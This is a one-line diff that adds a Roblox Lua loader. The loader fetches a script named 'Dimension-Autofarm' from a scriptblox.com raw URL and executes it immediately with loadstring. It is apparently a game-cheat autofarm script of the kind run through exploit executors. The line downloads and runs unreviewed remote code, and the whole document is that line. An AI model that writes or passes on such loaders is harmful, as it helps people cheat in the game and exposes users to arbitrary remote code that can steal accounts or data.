@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.scriptblox.com/raw/Dimension-Autofarm_431"))()
